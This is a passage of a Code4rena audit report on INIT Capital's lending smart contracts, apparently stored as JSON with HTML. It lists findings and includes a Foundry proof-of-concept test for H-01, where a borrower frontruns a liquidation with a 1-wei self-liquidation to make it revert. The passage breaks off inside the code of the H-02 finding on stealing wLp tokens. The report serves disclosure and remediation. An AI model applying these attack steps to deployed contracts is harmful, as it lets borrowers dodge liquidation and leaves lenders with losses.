{
  "circa": {
    "title": "INIT Capital Invitational",
    "sponsor": "INIT Capital",
    "slug": "2023-12-initcapital",
    "date": "2024-01-16",
    "findings": "https://github.com/code-423n4/2023-12-initcapital-findings/issues",
    "contest": 313
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the INIT Capital smart contract system written in Solidity. The audit took place between December 15—December 21 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>In Code4rena’s Invitational audits, the competition is limited to a small group of wardens; for this audit, 5 wardens contributed reports to INIT Capital:</p>\n<ol>\n<li><a href=\"https://code4rena.com/@said\">said</a></li>\n<li><a href=\"https://code4rena.com/@0x73696d616f\">0x73696d616f</a></li>\n<li><a href=\"https://code4rena.com/@ladboy233\">ladboy233</a></li>\n<li><a href=\"https://code4rena.com/@rvierdiiev\">rvierdiiev</a></li>\n<li><a href=\"https://code4rena.com/@sashik_eth\">sashik_eth</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://code4rena.com/@hansfriese\">hansfriese</a>.</p>\n<p>Final report assembled by PaperParachute.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 15 unique vulnerabilities. Of these vulnerabilities, 3 received a risk rating in the category of HIGH severity and 12 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 3 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 2 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-12-initcapital\">C4 INIT Capital repository</a>, and is composed of 17 smart contracts written in the Solidity programming language and includes 1545 lines of Solidity code.</p>\n<p>In addition to the known issues identified by the project team, an <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/4naly3er-report.md\">Automated Findings report</a> was generated using the <a href=\"https://github.com/Picodes/4naly3er\">4naly3er bot</a> and all findings therein were classified as out of scope.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-3\" style=\"position:relative;\"><a href=\"#high-risk-findings-3\" aria-label=\"high risk findings 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (3)</h1>\n<h2 id=\"h-01-liquidations-can-be-prevented-by-frontrunning-and-liquidating-1-debt-or-more-due-to-wrong-assumption-in-pos_manager\" style=\"position:relative;\"><a href=\"#h-01-liquidations-can-be-prevented-by-frontrunning-and-liquidating-1-debt-or-more-due-to-wrong-assumption-in-pos_manager\" aria-label=\"h 01 liquidations can be prevented by frontrunning and liquidating 1 debt or more due to wrong assumption in pos_manager permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/42\">[H-01] Liquidations can be prevented by frontrunning and liquidating 1 debt (or more) due to wrong assumption in POS_MANAGER</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/42\">0x73696d616f</a></em></p>\n<p>Users can avoid being liquidated if they frontrun liquidation calls with a liquidate call with 1 wei. Or, they may do a partial liquidation and avoid being liquidated before the interest reaches the value of the debt pre liquidation. The total interest stored in <code>__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest</code> would also be wrong.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>POS_MANAGER</code> stores the total interest in <code>__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest</code>. Function <code>updatePosDebtShares()</code> <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/PosManager.sol#L175\">assumes</a> that <code>ILendingPool(_pool).debtShareToAmtCurrent(currDebtShares)</code> is always increasing, but this is not the case, as a liquidation may happen that reduces the current debt amount. This leads to calls to <code>updatePosDebtShares()</code> reverting.</p>\n<p>The most relevant is when liquidating, such that users could liquidate themselves for small amounts (1) and prevent liqudiations in the same block. This is because the debt accrual happens over time, so if the block.timestamp is the same, no debt accrual will happen. Thus, if a liquidate call with 1 amount frontruns a liquidate call with any amount, the second call will revert.</p>\n<p>A user could still stop liquidations for as long as the accrued interest doesn’t reach the last debt value before liquidation, if the user liquidated a bigger part of the debt.</p>\n<p>Add the following test to <code>TestInitCore.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_POC_Liquidate_reverts_frontrunning_PosManager_WrongAssumption</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">poolUSDT</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">USDT</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">poolWBTC</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_setTargetHealthAfterLiquidation_e18</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint64</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// by pass max health after liquidate capped</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_setFixedRateIRM</span><span class=\"mtk1\">(</span><span class=\"mtk12\">poolWBTC</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0.1e18</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// 10% per sec</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collAmt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrAmt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collUSD</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrUSDMax</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">80_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_priceToTokenAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">USDT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collUSD</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">borrAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_priceToTokenAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">, </span><span class=\"mtk12\">borrUSDMax</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">BOB</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">USDT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">, </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">borrAmt</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// provides liquidity for borrow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_fundPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">poolWBTC</span><span class=\"mtk1\">, </span><span class=\"mtk12\">borrAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// create position and collateralize</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">posId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createPos</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_collateralizePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">poolUSDT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collAmt</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;&#39;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// borrow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_borrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">poolWBTC</span><span class=\"mtk1\">, </span><span class=\"mtk12\">borrAmt</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;&#39;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// fast forward time and accrue interest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">seconds</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">poolWBTC</span><span class=\"mtk1\">).</span><span class=\"mtk11\">accrueInterest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtShares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPosDebtShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">poolWBTC</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_liquidate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">posId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">poolWBTC</span><span class=\"mtk1\">, </span><span class=\"mtk12\">poolUSDT</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;&#39;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// liquidate all debtShares</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_liquidate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">posId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">, </span><span class=\"mtk12\">poolWBTC</span><span class=\"mtk1\">, </span><span class=\"mtk12\">poolUSDT</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;panic&#39;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Vscode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Update the user’s last debt position <code>__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest</code> on <code>_repay()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/42#issuecomment-1872425149\">fez-init (INIT) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/42#issuecomment-1872433152\">hansfriese (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>After discussing internally with the sponsor/warden, we’ve confirmed the issue.\nHere is a part of the discussion:</p>\n<blockquote>\n<p>“When it frontruns the liquidation with 1 share, it removes 1 share and 2 debt.<br>\nWhen it calculates the amount again in the following liquidation, the shares will be worth 1 less and it reverts.”</p>\n</blockquote>\n<p>As a mitigation, we can update <code>extraInfo.totalInterest</code> only when <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/PosManager.sol#L176\">debtAmtCurrent > extraInfo.lastDebtAmt</a>.</p>\n<p><img src=\"https://github.com/code-423n4/2023-12-initcapital-findings/assets/45533148/c1bd109c-4c8e-4683-b559-055128efb64f\" alt=\"image\"></p>\n<p>High is appropriate as the main invariant might be broken temporarily while repaying.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-wlp-tokens-could-be-stolen-\" style=\"position:relative;\"><a href=\"#h-02-wlp-tokens-could-be-stolen-\" aria-label=\"h 02 wlp tokens could be stolen  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/31\">[H-02] wLp tokens could be stolen </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/31\">sashik_eth</a>, also found by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/24\">said</a></em></p>\n<p><code>PosManager#removeCollateralWLpTo</code> function allows users to remove collateral wrapped in a wLp token that was previously supplied to the protocol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">PosManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeCollateralWLpTo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 